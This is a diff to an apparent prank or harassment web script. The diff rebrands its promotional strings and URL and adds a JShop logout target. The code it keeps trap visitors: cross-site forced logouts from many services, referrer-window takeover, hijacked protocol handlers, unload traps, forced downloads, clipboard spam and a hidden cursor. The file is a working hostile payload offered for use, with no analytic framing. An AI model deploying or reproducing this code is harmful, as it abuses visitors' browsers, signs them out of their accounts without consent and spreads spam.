@@ -1,9 +1,4 @@
-<html>
-    <body>
-        <img src="CB_CZOG.jpg" alt="Cycu" width="100%" height="100%">
-    </body>
-   <script>
-        const SCREEN_WIDTH = window.screen.availWidth
+const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 480
 const WIN_HEIGHT = 260
@@ -11,12 +6,12 @@ const VELOCITY = 15
 const MARGIN = 10
 const TICK_LENGTH = 50
 
-const HIDDEN_STYLE = 'position: fixed; width: 1000px; height: 1000px; overflow: hidden; top: 100px; left: 1000px;'
+const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 
 const SEARCHES = [
-  'CB biznes',
-  'cycurro',
   'cycu',
+  'cycurro',
+  'CB biznes',
   'prezes'
 ]
 
@@ -62,7 +57,8 @@ const LOGOUT_SITES = {
   'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
   Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
   Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
-  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
+  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
+  JShop: ['GET', 'https://jshop.partners/panel/logout']
 }
 
 /**
@@ -197,26 +193,16 @@ function initParentWindow () {
   interceptUserInput(event => {
     // Only run these on the first interaction
     if (interactionCount === 1) {
-      
-        registerProtocolHandlers()
-      
+      registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
-      
       hideCursor()
-      
       startVideo()
-      
       startAlertInterval()
-      
       superLogout()
-      
       removeHelloMessage()
-      
       rainbowThemeColor()
-     
       animateUrlWithEmojis()
-      
-      speak('cycurro')
+      speak('That was a mistake')
     }
   })
 }
@@ -255,7 +241,7 @@ function isParentSameOrigin () {
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
-    speak('CYCU/ Najlepszy serwer discord to CB BIZNES')
+    speak('Please don\'t go!')
     event.returnValue = true
   })
 }
@@ -293,7 +279,7 @@ function registerProtocolHandlers () {
   const handlerUrl = window.location.href + '/url=%s'
 
   protocolWhitelist.forEach(proto => {
-    navigator.registerProtocolHandler(proto, handlerUrl, 'Pan0nikt')
+    navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek')
   })
 }
 
@@ -542,8 +528,7 @@ function hideCursor () {
  * interaction. Further file downloads should happen in response to a user-initiated
  * event or they will be blocked.
  */
-
- function triggerFileDownload () {
+function triggerFileDownload () {
   const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
   const a = document.createElement('a')
   a.href = fileName
@@ -833,7 +818,7 @@ function rainbowThemeColor () {
  * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
  */
 function copySpamToClipboard () {
-  const randomArt = getRandomArrayEntry(ART) + '\nSprawdz https://pan0nikt.github.io/'
+  const randomArt = getRandomArrayEntry(ART) + '\nSprawdz https://ptoszek.pl/'
   clipboardCopy(randomArt)
 }
 
@@ -1059,57 +1044,4 @@ function setupSearchWindow (win) {
       searchIndex += 1
     }, 500)
   }, 2500)
-}
-</script>
-
-<script>
-    // Here are the initial values for our animation. 
-    var x = 0, y = 0, w=200, h=200;  // Window position and size
-    var dx = 5, dy = 5;              // Window velocity   
-    var interval = 100;              // Milliseconds between updates
-    
-    // Create the window that we're going to move around.
-    // The javascript: URL is simply a way to display a short document.
-    // The final argument specifies the window size.
-    var win = window.open('javascript:"<h1>BOUNCE!</h1>"', "", 
-              "width=" + w + ",height=100%" + h);
-    
-    // Set the initial position of the window.
-    win.moveTo(x,y);
-    
-    // Use setInterval() to call the bounce() method every interval 
-    // milliseconds. Store the return value so that we can stop the
-    // animation by passing it to clearInterval().
-    var intervalID  = window.setInterval("Cycu()", interval);
-    
-    // This function moves the window by (dx, dy) every interval ms.
-    // It bounces whenever the window reaches the edge of the screen.
-    function Cycu() {
-        // If the user closed the window, stop the animation.
-        if (win.closed) {
-            clearInterval(intervalID);
-            return;
-        }
-    
-        // Bounce if we have reached the right or left edge.
-        if ((x+dx > (screen.availWidth - w)) || (x+dx < 0)) dx = -dx;
-    
-        // Bounce if we have reached the bottom or top edge.
-        if ((y+dy > (screen.availHeight - h)) || (y+dy < 0)) dy = -dy;
-    
-        // Update the current position of the window.
-        x += dx;
-        y += dy;
-    
-        // Finally, move the window to the new position.
-        win.moveTo(x,y);
-    }
-    </script>
-    
-
-
-
-
-
-
-</html>
+} 
